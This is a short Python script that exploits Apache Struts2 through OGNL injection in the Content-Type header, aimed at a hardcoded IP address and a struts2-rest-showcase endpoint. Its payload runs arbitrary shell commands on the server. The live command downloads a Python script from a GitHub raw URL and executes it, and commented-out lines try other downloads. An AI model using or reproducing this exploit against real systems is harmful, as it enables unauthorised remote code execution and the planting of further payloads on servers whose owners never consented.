#!/usr/bin/python

import requests

struts = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
struts2= "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

#command = 'cd /var/tmp && cat RunMe.py'
#command = 'cd /var/tmp && curl https://raw.githubusercontent.com/kcperk/ApacheTest/master/RunMe.py > RunMe2.py && ls && cat RunMe2.py'
command = 'cd /var/tmp && curl https://raw.githubusercontent.com/kcperk/ApacheTest/master/RunMe7.py> RunMe.py && python3 RunMe.py'
attack = struts+command+struts2
headerz = {'Host':'104.131.75.39', 'Content-Type':attack, 'Connection':'Close'}



resp = requests.post("http://104.131.75.39:18080/struts2-rest-showcase/orders", headers=headerz)
print resp.request.headers, "\n"
print resp.headers, "\n"
print resp.content
